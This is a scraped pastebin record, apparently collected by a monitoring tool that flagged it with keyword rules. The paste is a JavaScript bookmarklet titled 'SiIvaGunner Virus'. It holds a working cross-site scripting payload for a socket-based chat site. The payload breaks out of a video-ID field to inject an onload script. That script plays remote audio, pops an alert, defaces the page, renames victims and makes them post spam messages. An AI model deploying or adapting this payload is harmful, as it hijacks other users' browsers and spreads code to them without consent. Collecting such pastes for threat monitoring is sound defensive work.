{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=Sak7Z02g",
    "full_url": "https://pastebin.com/Sak7Z02g",
    "date": "1594747539",
    "key": "Sak7Z02g",
    "size": 1199,
    "expire": "0",
    "title": "SiIvaGunner Virus",
    "syntax": "javascript",
    "user": "Glitch56",
    "filename": "Sak7Z02g",
    "pasteid": "Sak7Z02g",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-14T17:25:39",
    "MD5": "e2859246134eb60afb8ae24b707d3d06",
    "SHA256": "5bcc07cbeed6f800ba925fcea0143708754e2e7ab0e51f6029d070c3e45aa17b",
    "raw_paste": "javascript:socket.emit('command',{list:['youtube','dv-TVTBDfOo\" onload=\"audio = new Audio(\\'https://cdn.discordapp.com/attachments/315870104988418048/630442967357718560/losky_virus_song.mp3\\'), audio.play(), alert(\\'Congratulations! You got hacked by SiIvaGunner, now, your punishment is to listen to SiIvaGunner high quality rips, Don't worry, you can reload the page :)\\'), setInterval(function(){document.title = \\'HighQUALITY\\', document.getElementById(\\'content\\').style.backgroundImage = \\'url(https://vignette.wikia.nocookie.net/siivagunner/images/e/e9/SiivaGunner_post-strike.png/revision/latest/scale-to-width-down/310?cb=20190301022411)\\', socket.emit(\\'command\\',{list:[\\'name\\',\\'SiIvaGunner Fan\\']}), document.getElementById(\\'content\\').style.backgroundRepeat = \\'repeat\\', document.getElementById(\\'chat_send\\').style.backgroundImage = \\'url(https://cdn.discordapp.com/attachments/315888694034825228/630412276821917736/emote.gif)\\', document.getElementById(\\'chat_bar\\').style.backgroundImage = \\'url(https://cdn.discordapp.com/attachments/315888694034825228/630412276821917736/emote.gif)\\', socket.emit(\\'talk\\',{text:\\'SiIvaGunner is the best ever in the planet!\\'})}, 100)\" u=\"']})",
    "YaraRule": [
        "hacked",
        "core_keywords"
    ]
}